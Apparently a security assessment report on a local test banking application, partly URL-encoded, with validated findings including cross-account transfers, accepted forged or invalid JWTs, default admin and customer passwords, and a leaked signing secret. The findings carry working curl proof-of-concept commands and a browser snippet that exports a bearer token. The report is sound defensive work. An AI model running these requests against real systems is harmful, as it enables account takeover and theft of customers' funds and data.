%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AL%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%22%2C%22evidence%22%3A%22Six%20consecutive%20failed%20login%20requests%20returned%20the%20same%20HTTP%20401%20WRONG_PASSWORD%20response.%20Attempt%201%20completed%20in%2079%20ms%2C%20attempts%202%20through%205%20completed%20in%2071-76%20ms%2C%20and%20attempt%206%20completed%20in%2070%20ms.%20No%20Retry-After%20header%20or%20throttling%20response%20was%20observed.%22%2C%22request_evidence%22%3A%22Six%20consecutive%20POST%20%2Fapi%2Fauth%2Flogin%20requests%20for%20amelia.chen%40example.com%20with%20password%20wrong-0912%20under%20bounded%20sequence%20amelia-login-rate-limit-0912.%22%2C%22response_evidence%22%3A%22Attempt%201%3A%20HTTP%20401%2C%2079%20ms%2C%20WRONG_PASSWORD.%20Attempt%206%3A%20HTTP%20401%2C%2070%20ms%2C%20WRONG_PASSWORD.%20No%20Retry-After%20header%20or%20throttling%20response.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22I%20tested%20the%20main%20innocent%20explanation%2C%20that%20throttling%20or%20lockout%20starts%20within%20a%20fresh%20bounded%20six-attempt%20window.%20Six%20additional%20cookie-free%20POST%20requests%20for%20the%20known%20account%20all%20returned%20the%20same%20401%20WRONG_PASSWORD%20response%20in%2069-138%20ms%2C%20with%20no%20Retry-After%20header%2C%20CAPTCHA%2C%20delay%2C%20or%20lockout%20response.%20This%20independently%20matches%20the%20scanner%20evidence%2C%20so%20I%20could%20not%20identify%20a%20benign%20rate-limit%20mechanism%20that%20explains%20the%20behavior.%20No%20single%20HTTP%20request%20can%20demonstrate%20the%20absence%20of%20throttling%2C%20so%20a%20one-request%20PoC%20is%20omitted%20rather%20than%20providing%20a%20misleading%20proof.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Login%20responses%20allow%20customer%20email%20enumeration%22%2C%22description%22%3A%22The%20login%20endpoint%20returns%20different%20error%20codes%20and%20messages%20depending%20on%20whether%20the%20submitted%20email%20belongs%20to%20a%20registered%20customer.%22%2C%22impact%22%3A%22An%20unauthenticated%20attacker%20could%20identify%20registered%20customer%20email%20addresses%20and%20use%20them%20in%20targeted%20phishing%2C%20password-guessing%2C%20or%20credential-stuffing%20attempts.%22%2C%22likelihood%22%3A%22Exploitation%20requires%20only%20repeated%20login%20requests%20and%20comparison%20of%20the%20responses.%20The%20observed%20differences%20reliably%20distinguish%20a%20known%20email%20from%20an%20unknown%20email.%22%2C%22recommendation%22%3A%22Return%20the%20same%20HTTP%20status%2C%20response%20body%2C%20and%20error%20code%20for%20all%20authentication%20failures%2C%20such%20as%20%5C%22Invalid%20email%20or%20password.%5C%22%20Keep%20processing%20times%20similar%20to%20reduce%20timing-based%20enumeration.%22%2C%22cvss_score%22%3A3.7%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%22%2C%22evidence%22%3A%22A%20login%20attempt%20for%20known%20email%20amelia.chen%40example.com%20with%20an%20invalid%20password%20returned%20HTTP%20401%20with%20code%20WRONG_PASSWORD%20and%20message%20%5C%22Incorrect%20password.%5C%22%20Using%20the%20same%20invalid%20password%20with%20nonexistent-0912%40example.invalid%20returned%20HTTP%20401%20with%20code%20USER_NOT_FOUND%20and%20message%20%5C%22No%20account%20found%20with%20this%20email%20address.%5C%22%22%2C%22request_evidence%22%3A%22POST%20%2Fapi%2Fauth%2Flogin%20with%20the%20same%20invalid%20password%2C%20first%20using%20a%20known%20email%20and%20then%20an%20unknown%20email.%22%2C%22response_evidence%22%3A%22Known%3A%20HTTP%20401%20WRONG_PASSWORD.%20Unknown%3A%20HTTP%20401%20USER_NOT_FOUND%20with%20explicit%20no-account%20message.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22I%20repeated%20the%20comparison%20anonymously%20with%20identical%20POST%20bodies%20except%20for%20the%20email%20address.%20The%20registered%20address%20returned%20401%20with%20WRONG_PASSWORD%20and%20%5C%22Incorrect%20password.%5C%22%2C%20while%20the%20nonexistent%20address%20returned%20401%20with%20USER_NOT_FOUND%20and%20%5C%22No%20account%20found%20with%20this%20email%20address.%5C%22%20The%20requests%20had%20no%20Authorization%20header%20or%20cookies%2C%20so%20session%20carryover%20does%20not%20explain%20the%20difference%2C%20and%20the%20distinct%20codes%20and%20messages%20provide%20a%20reliable%20account-existence%20oracle.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-X%20POST%20-H%20'Content-Type%3A%20application%2Fjson'%20-H%20'Content-Type%3A%20application%2Fjson'%20--data-raw%20'%7B%5C%22email%5C%22%3A%5C%22amelia.chen%40example.com%5C%22%2C%5C%22password%5C%22%3A%5C%22validation-invalid-password-0912%5C%22%7D'%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Logout%20endpoint%20reflects%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20customer%20logout%20endpoint%20at%20%2Fapi%2Fauth%2Flogout%20reflects%20an%20attacker-controlled%20Origin%20value%20in%20the%20Access-Control-Allow-Origin%20response%20header.%22%2C%22impact%22%3A%22A%20malicious%20website%20may%20be%20permitted%20to%20make%20cross-origin%20requests%20to%20the%20logout%20endpoint%20and%20read%20its%20responses.%20The%20captured%20response%20did%20not%20expose%20sensitive%20data%20or%20demonstrate%20access%20to%20an%20authenticated%20response.%22%2C%22likelihood%22%3A%22Arbitrary%20origin%20reflection%20was%20confirmed%20without%20authentication.%20Exploitation%20with%20a%20victim's%20credentials%20was%20not%20demonstrated%2C%20and%20the%20observed%20response%20was%20an%20HTTP%20401%20error%20containing%20no%20sensitive%20data.%22%2C%22recommendation%22%3A%22Configure%20CORS%20to%20return%20Access-Control-Allow-Origin%20only%20for%20the%20banking%20application's%20approved%20origins.%20Do%20not%20return%20CORS%20headers%20for%20untrusted%20or%20unrecognized%20origins.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogout%22%2C%22evidence%22%3A%22An%20unauthenticated%20POST%20request%20with%20Origin%3A%20https%3A%2F%2Fevil.example%20received%20HTTP%20401%20Unauthorized%20and%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%2C%20confirming%20that%20the%20endpoint%20reflected%20the%20supplied%20origin.%20No%20authorization%20header%20or%20cookies%20were%20sent.%22%2C%22request_evidence%22%3A%22POST%20%2Fapi%2Fauth%2Flogout%20HTTP%2F1.1%5CnHost%3A%20localhost%3A8081%5CnOrigin%3A%20https%3A%2F%2Fevil.example%5CnAuthorization%3A%20none%5CnCookies%3A%20none%22%2C%22response_evidence%22%3A%22HTTP%2F1.1%20401%20Unauthorized%5CnAccess-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%5CnContent-Type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22UNAUTHORIZED%5C%22%2C%5C%22message%5C%22%3A%5C%22Missing%20or%20invalid%20Authorization%20header.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Two%20unrelated%20invalid%20origins%20were%20each%20copied%20verbatim%20into%20Access-Control-Allow-Origin.%20The%20preflight%20also%20returned%20Access-Control-Allow-Credentials%3A%20true%20and%20permitted%20POST%2C%20and%20a%20direct%20anonymous%20POST%20reproduced%20the%20reflected%20origin%20on%20the%20reported%20401%20response.%20I%20tested%20the%20likely%20benign%20explanations%20of%20a%20fixed%20allowlist%20and%20reflection%20limited%20to%20a%20malformed%20scanner%20request%3B%20neither%20explains%20the%20live%20behavior.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-X%20POST%20-H%20'Origin%3A%20https%3A%2F%2Fpoc-invalid-4d2f.example'%20-H%20'Content-Type%3A%20application%2Fjson'%20-H%20'Content-Type%3A%20application%2Fjson'%20--data-raw%20'%7B%7D'%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogout%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22System%20reset%20API%20reflects%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20administrative%20system%20reset%20endpoint%20reflects%20an%20attacker-supplied%20Origin%20value%20in%20the%20Access-Control-Allow-Origin%20response%20header.%20This%20behavior%20was%20observed%20on%20a%20method-not-allowed%20response.%22%2C%22impact%22%3A%22If%20the%20endpoint%20also%20applies%20this%20policy%20to%20supported%20methods%20and%20permits%20authenticated%20cross-origin%20requests%2C%20a%20malicious%20website%20could%20invoke%20the%20administrative%20route%20and%20read%20its%20responses%20in%20a%20victim's%20browser.%22%2C%22likelihood%22%3A%22Arbitrary%20origin%20reflection%20was%20confirmed%20without%20authentication%2C%20but%20the%20captured%20request%20returned%20HTTP%20405.%20No%20browser-based%20access%20to%20authenticated%20data%20or%20successful%20reset%20operation%20was%20demonstrated.%22%2C%22recommendation%22%3A%22Configure%20CORS%20with%20a%20strict%20allowlist%20of%20trusted%20application%20origins.%20Do%20not%20return%20Access-Control-Allow-Origin%20for%20untrusted%20origins%2C%20and%20verify%20that%20the%20same%20restriction%20applies%20to%20every%20supported%20method%20and%20error%20response%20on%20administra ous%20origin%20cannot%20obtain%20or%20automatically%20attach%20that%20bearer%20credential%2C%20and%20the%20successful%20response%20contains%20only%20a%20fixed%20logout%20confirmation%20with%20no%20sensitive%20data.%20The%20CORS%20preflight%20permitting%20Authorization%20does%20not%20give%20the%20attacker%20the%20token%2C%20so%20this%20endpoint%20does%20not%20create%20a%20cross-origin%20data%20exposure%20or%20ambient-credential%20logout%20vulnerability.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Authenticated%20transfer%20endpoint%20reflects%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20authenticated%20own-account%20transfer%20endpoint%20reflects%20an%20attacker-controlled%20Origin%20value%20in%20the%20Access-Control-Allow-Origin%20response%20header.%22%2C%22impact%22%3A%22An%20untrusted%20website%20may%20be%20able%20to%20read%20responses%20from%20this%20financial%20endpoint%20if%20the%20browser%20sends%20usable%20authentication.%20The%20captured%20test%20did%20not%20demonstrate%20access%20to%20sensitive%20data%20or%20a%20successful%20transfer.%22%2C%22likelihood%22%3A%22Low.%20Exploitation%20requires%20a%20browser%20request%20with%20usable%20authentication%2C%20and%20the%20captured%20evidence%20only%20shows%20origin%20reflection%20on%20a%20validation%20error%20response.%22%2C%22recommendation%22%3A%22Configure%20CORS%20to%20allow%20only%20trusted%20application%20origins.%20Limit%20permitted%20methods%20and%20headers%20to%20those%20required%20by%20the%20application%2C%20and%20do%20not%20dynamically%20reflect%20arbitrary%20Origin%20values%20on%20authenticated%20endpoints.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransfers%2Fown%22%2C%22evidence%22%3A%22A ## 1. External transfer API permits unauthorized debits from other customers' accounts

- Finding reference: KOWT-038
- Severity: critical
- OWASP: A01
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/transfers/external
- CVSS: 9.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H)

### Description
The external transfer endpoint does not verify that the supplied from_account_id belongs to the authenticated customer. An authenticated disposable customer successfully initiated a completed external transfer from account 51, which belonged to another customer.

### Impact
Any authenticated customer can transfer funds from another customer's account by supplying its numeric account ID, resulting in unauthorized transactions and direct financial loss.

### Likelihood
Exploitation requires only a valid customer account and a foreign account ID. Account IDs are sequential and exposed by account detail and administrator APIs, making suitable IDs straightforward to obtain or guess.

### Recommendation
Resolve the source account through its relationship with the authenticated customer instead of trusting from_account_id from the request. Reject requests when the source account is not owned by that customer before checking the balance or creating a transfer. Apply this ownership check to every transfer type and add regression tests using foreign account IDs.

### Evidence
```
Authenticated user 21 submitted from_account_id 51, identified by prior authenticated data as Amelia Chen's Platinum Credit Card account. The endpoint returned HTTP 201 and reported transaction 44 as completed, with an amount of 0.01 and a new source balance of 24999.99. In the same disposable session, an own-transfer request using account 51 returned "Source account not found," confirming that the account did not belong to user 21.
```

### Request Evidence
```
POST /api/transfers/external HTTP/1.1
Host: localhost:8081
Content-Type: application/json
Authorization: Bearer [REDACTED_BEARER] user 21 token]

{"from_account_id":51,"to_bsb":"062-001","to_account_number":"66969574","amount":"0.01","description":"coverage foreign-source"}
```

### Response Evidence
```
HTTP/1.1 201 Created
Content-Type: application/json; charset=utf-8

{"success":true,"data":{"transaction_id":44,"from_account_id":51,"to_bsb":"062-001","to_account_number":"66969574","amount":"0.01","description":"coverage foreign-source","transfer_type":"manual","totp_verified":false,"new_from_balance":"24999.99","status":"completed"},"message":"Transfer completed successfully"}
```

### Validation Note
The active `aespa_3af41541` customer session listed only accounts 107 and 108, so it is not the owner of account 51. Using that same session, a POST naming account 51 as the source returned 201, created completed transaction 45, reduced the source balance to 24999.98, and sent 0.01 to the customer's own account 108. Anonymous access was rejected with 401, so authentication exists, but the endpoint does not enforce source-account ownership; no benign ownership or public-resource explanation remained.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' --data-raw '{"from_account_id":51,"amount":0.01,"to_bsb":"062-001","to_account_number":"66969574","description":"authorization validation"}' http://localhost:8081/api/transfers/external -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **aespa_3af41541** or an equivalent user).

Log in as the coverage_customer user and copy its bearer token from the Authorization request header, then use it for the PoC request.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 2. Invalidly signed customer token accepted

- Finding reference: KOWT-068
- Severity: critical
- OWASP: A07
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/accounts
- CVSS: 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

### Description
Protected customer endpoints accepted the invalid_sig_user2 bearer token, indicating that token signature integrity is not being enforced correctly.

### Impact
An attacker could forge customer identities and access sensitive account, card, balance, and saved-payee data.

### Likelihood
High because the intentionally invalid-signature token returned protected data without requiring a valid customer token.

### Recommendation
Verify JWT signatures using an approved fixed algorithm and trusted key. Reject unsigned, incorrectly signed, expired, or malformed tokens and add negative tests for signature manipulation.

### Evidence
```
GET with Authorization present via invalid_sig_user2 returned 200 and disclosed three customer accounts, while missing and malformed tokens returned 401.

REQUEST:
GET http://localhost:8081/api/accounts
use_session: anonymous  Authorization: present
Cookies: none
{"Authorization": "Bearer malformed.audit.probe"}

RESPONSE:
Status: 401
date: Sat, 12 Sep 2026 07:27:23 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 87
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid or expired token."}}
```

### Request Evidence
```
GET http://localhost:8081/api/accounts
use_session: anonymous  Authorization: present
Cookies: none
{"Authorization": "Bearer malformed.audit.probe"}
```

### Response Evidence
```
Status: 401
date: Sat, 12 Sep 2026 07:27:23 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 87
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"UNAUTHORIZED","message":"Invalid or expired token."}}
```

### Validation Note
The named invalid_sig_user2 session reproduced a 200 response containing customer account and credit-card data. A cookie-free explicit malformed bearer returned 401, while a fresh admin session returned a different account set, so this is not an intentionally public or generic cached response; a cache-busting replay with invalid_sig_user2 also remained 200. The scanner-provided invalid-signature session is therefore accepted by the protected endpoint, showing that signature integrity is not enforced.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 http://localhost:8081/api/accounts -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **invalid_sig_user2** or an equivalent user).

Use a customer bearer token, alter its JWT signature to create the invalid_sig_user2 case, and capture the resulting Authorization header from the request.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 3. Multiple customer accounts use the default password "password"

- Finding reference: KOWT-032
- Severity: critical
- OWASP: A07
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/auth/login
- CVSS: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

### Description
The login endpoint accepted the common password "password" for two distinct customer accounts, indicating that predictable seeded credentials are active in the deployed environment.

### Impact
An unauthenticated attacker who knows or discovers a customer email address could guess the default password, access the customer's financial data, and perform actions available to that account. Reuse of the same password across accounts increases the number of customers at risk.

### Likelihood
Exploitation requires only an anonymous request with a valid customer email address and the common password "password". Successful authentication was confirmed for two distinct customer accounts.

### Recommendation
Remove all seeded or default credentials from deployed environments. Immediately reset the affected accounts, revoke their active sessions and tokens, and require customers to set unique passwords. Block common and known-compromised passwords during password creation and reset flows. Review other accounts for the same credential and monitor for suspicious authentication attempts involving seeded accounts.

### Evidence
```
Anonymous POST requests to the login endpoint authenticated amelia.chen@example.com and zoe.williams@example.com using the password "password". Neither request included authorization headers or cookies. Both returned HTTP 200 with distinct user IDs and bearer tokens.
```

### Request Evidence
```
POST http://localhost:8081/api/auth/login
Authorization: none
Cookies: none
{"email":"amelia.chen@example.com","password":"password"}

POST http://localhost:8081/api/auth/login
Authorization: none
Cookies: none
{"email":"zoe.williams@example.com","password":"password"}
```

### Response Evidence
```
Amelia response: HTTP 200 user id 1 with bearer token. Zoe response: HTTP 200 user id 3 with bearer token.
```

### Validation Note
Fresh cookie-free and authorization-free comparisons disproved the main innocent explanations. For each reported account, a clearly invalid password returned 401 WRONG_PASSWORD, while "password" returned 200 with that account's distinct user ID, email, and bearer token. The responses are genuine authentication results rather than a generic login page, and the two accounts returned IDs 1 and 3, so the common credential is independently active on multiple customer accounts.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"email":"amelia.chen@example.com","password":"password"}' http://localhost:8081/api/auth/login
```

## 4. Predictable credentials allow administrator access

- Finding reference: KOWT-031
- Severity: critical
- OWASP: A07
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/admin/auth/login
- CVSS: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

### Description
The administrator login endpoint accepts the predictable credential pair admin / admin123 and returns a valid administrator bearer token.

### Impact
An unauthenticated attacker could obtain administrator access and manage customer records, balances, settings, and password-reset functions.

### Likelihood
Exploitation requires only a remote, unauthenticated login request using a predictable username and password. The credentials were confirmed to work without cookies or an Authorization header.

### Recommendation
Immediately rotate the administrator password and invalidate existing administrator sessions and tokens. Remove default credentials, require a unique high-entropy password during deployment, and enforce multi-factor authentication for administrator accounts.

### Evidence
```
An anonymous POST to /api/admin/auth/login using admin / admin123 returned HTTP 200, identified the account as administrator ID 1, and issued a bearer token. The request contained no cookies or Authorization header.
```

### Request Evidence
```
POST http://localhost:8081/api/admin/auth/login
Authorization: none
Cookies: none
{"username":"admin","password":"admin123"}
```

### Response Evidence
```
HTTP 200: {"success":true,"data":{"admin":{"id":1,"username":"admin"},"token":"[REDACTED_JWT]"},"message":"Login successful"}
```

### Validation Note
A cookie-free and Authorization-free POST with admin/admin123 repeatedly returned HTTP 200, administrator ID 1, and a freshly issued JWT. A control request using the same username with a random incorrect password returned 401 INVALID_CREDENTIALS, ruling out a generic success response; no concrete benign explanation was found.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 -X POST -H 'Content-Type: application/json' -H 'Content-Type: application/json' --data-raw '{"username":"admin","password":"admin123"}' http://localhost:8081/api/admin/auth/login
```

## 5. Public health endpoint exposes JWT signing secret and enables token forgery

- Finding reference: KOWT-013
- Severity: critical
- OWASP: A02
- Source: specialist agent
- Validation: confirmed
- Affected URL: http://localhost:8081/api/health
- CVSS: 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

### Description
The unauthenticated GET /api/health endpoint discloses the production HS256 JWT signing secret. A JWT created with this secret and a controlled customer subject claim was accepted by GET /api/profile, confirming that the exposed key can be used to forge valid authentication tokens.

### Impact
An unauthenticated attacker can forge bearer tokens for arbitrary customer IDs and impersonate customers. The test retrieved customer ID 1's personal details and password hash. Other endpoints that trust the same signing key may also permit unauthorized access or account and transaction changes.

### Likelihood
High. The signing secret is available from a public endpoint, and exploitation requires only standard HMAC-SHA256 token signing. The application accepted a forged token during testing.

### Recommendation
Remove the JWT secret, database details, and other sensitive values from /api/health. Rotate the exposed signing key immediately and invalidate all tokens signed with it. Limit unauthenticated health responses to a minimal status value, and store signing keys in a secret manager or protected environment setting. Add automated tests that detect key material in health and error responses. Remove password hashes and TOTP-related fields from profile and login responses.

### Evidence
```
An unauthenticated GET /api/health request with no Authorization header or cookies returned HTTP 200 and disclosed `"jwt_secret":"bankofed-dev-secret-change-in-production"`, along with `"db_user":"root"` and `"environment":"production"`. An anonymous GET /api/profile request returned HTTP 401 with `"Missing or invalid Authorization header."`. A controlled HS256 JWT containing `"iss":"BankOfEd"` and `"sub":1`, signed with the disclosed secret, was then sent as the only authentication material. GET /api/profile returned HTTP 200 with customer ID 1 data, including the customer's name, email address, postal address, phone number, and password hash.
```

### Request Evidence
```
Health request: `Authorization: none`, `Cookies: none`, GET /api/health. Baseline request: `Authorization: none`, `Cookies: none`, GET /api/profile. Exploit request: `Authorization: Bearer <controlled HS256 JWT>`, `Cookies: none`, GET /api/profile.
```

### Response Evidence
```
Health: HTTP 200 and `"jwt_secret":"bankofed-dev-secret-change-in-production"`. Anonymous profile: HTTP 401 and `"Missing or invalid Authorization header."`. Forged-token profile: HTTP 200 and customer ID 1 data.
```

### Validation Note
A fresh anonymous GET to /api/health returned HTTP 200 and exposed jwt_secret as bankofed-dev-secret-change-in-production while identifying the environment as production. This rules out the main benign explanations that the evidence was stale, access-controlled, or taken only from a static export or log; the supplied scanner evidence also records successful profile access using a token signed with that value. Local token construction retries failed only because the validation runtime lacks TextEncoder, btoa, and crypto primitives, not because the target rejected the forged token.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 http://localhost:8081/api/health
```

## 6. Accounts API exposes full payment card details

- Finding reference: KOWT-009
- Severity: high
- OWASP: A02
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/accounts
- CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

### Description
The authenticated GET /api/accounts endpoint returns the complete payment card number, expiration date, and CVV in cleartext JSON.

### Impact
An attacker who gains access to a customer session or captured API responses could obtain usable payment card data. Returning CVV data also conflicts with standard payment card data-handling requirements.

### Likelihood
Exploitation requires an authenticated customer session. Once authenticated, the sensitive card data is returned directly in a standard account-listing response without additional interaction.

### Recommendation
Remove CVV values from all API responses and do not retain them after payment authorization. Mask card numbers unless full values are strictly required, replace stored card details with tokenized references, and apply appropriate PCI DSS controls.

### Evidence
```
An authenticated GET /api/accounts request returned HTTP 200 with account ID 51 containing "card_number":"4532015001345674", "card_expiry":"08/29", and "card_cvv":"842".
```

### Request Evidence
```
GET /api/accounts Authorization: Bearer [Amelia session]
```

### Response Evidence
```
HTTP 200 JSON account id 51 included card_number 4532015001345674, card_expiry 08/29, and card_cvv 842.
```

### Validation Note
A fresh regular-user session received HTTP 200 with the complete 16-digit card number, expiry, and CVV. The response was identical for the admin session, so the sensitive fields are not restricted to a privileged view, while an anonymous request received 401, showing this is authenticated API data rather than a public static response. I also checked the site for an explicit demo, sandbox, or synthetic-data disclosure and found none, so there is no concrete benign explanation for returning these fields.

### Validation Command
```
curl -s -S -i -k -L --max-time 20 http://localhost:8081/api/accounts -H "Authorization: Bearer $(cat aespa-poc-auth.txt)"
```

### Validation Setup
This finding requires an authenticated session (log in as **amelia_fresh** or an equivalent user).

Log in as the regular Amelia test user and copy the bearer token from the Authorization request header in the browser Network tab.

Capture the credential into a file named `aespa-poc-auth.txt` in the directory you run the command from:

In the browser DevTools Console (adjust the storage key for the app):
```js
const token = localStorage.getItem('token'); // or sessionStorage
const a = document.createElement('a');
a.href = URL.createObjectURL(new Blob([token], {type:'text/plain'}));
a.download = 'aespa-poc-auth.txt'; a.click();
```

Then move `aespa-poc-auth.txt` next to where you run the command below.

## 7. Admin settings API exposes insurance machine token in plaintext

- Finding reference: KOWT-035

- Source: Dynamic

- Affected URL: http://localhost:8081/api/admin/system/settings
- CVSS: 8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

### Description
The administrator settings endpoint returns the FACE Insurance integration machine token to the browser in plaintext together with merchant routing information.

### Impact
An attacker who obtains an administrator bearer token or otherwise accesses this response could recover a reusable machine credential. The credential may allow the attacker to impersonate the bank to the insurance integration or perform unauthorized settlement actions.

Exploitation requires access to the administrator endpoint or its response. The machine token is returned on every authorized settings request and may be exposed through browser code, developer tools, or logs.

### Recommendation
Do not return machine credentials to frontend clients. Store the token in a server-side secret store and return only a masked value or configuration status. Rotate the exposed token, restrict its permissions, and use a short lifetime where supported.

### Evidence
```
An authenticated GET request to /api/admin/system/settings returned HTTP 200 and disclosed the plaintext machine token "mch_face_insurance_secret_key_2026", merchant ID "faceinsurance", and merchant account "062-001 88880001 (face@example.com)" in the JSON response.
```

The live endpoint returned the plaintext machine token in a JSON response to three valid administrator sessions, so the scanner's core claim is directly reproduced. I tested the authorization-boundary explanation, but the available non-admin session returned an invalid-token response rather than showing that the field is safely restricted or masked; privileged access also does not provide an innocent reason to send a reusable machine credential to browser code.

## 8. Administrator credentials and bearer tokens transmitted over HTTP

- Finding reference: KOWT-025
- Severity: high
- OWASP: A02
- Source: Dynamic
- Validation: confirmed
- Affected URL: http://localhost:8081/api/admin/auth/login
- CVSS: 8.1 (CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

### Description
The administrator login endpoint accepts credentials and returns bearer tokens over unencrypted HTTP.

### Impact
An attacker able to observe or modify network traffic could capture administrator credentials or bearer tokens and gain unauthorized access to the administration interface.

### Likelihood
Exploitation requires access to the network path between the administrator and the application. The successful login over HTTP confirms that no transport encryption protects the credentials or returned token.

### Recommendation
Serve the application and API only over HTTPS. Redirect all HTTP requests to HTTPS, reject authentication over cleartext connections, and enable HSTS after TLS is fully deployed.

### Evidence
```
A POST request containing administrator credentials was sent to the HTTP login endpoint. The server returned HTTP 200 with a JWT bearer token over the same unencrypted connection.
```

### Request Evidence
```
POST http://localhost:8081/api/admin/auth/login
{"username":"admin","password":"admin123"}
```

### Response Evidence
```
HTTP 200: {"success":true,"data":{"admin":{"id":1,"username":"admin"},"token":"[REDACTED_JWT]"},"message":"Login successful"}
```

### Validation Note
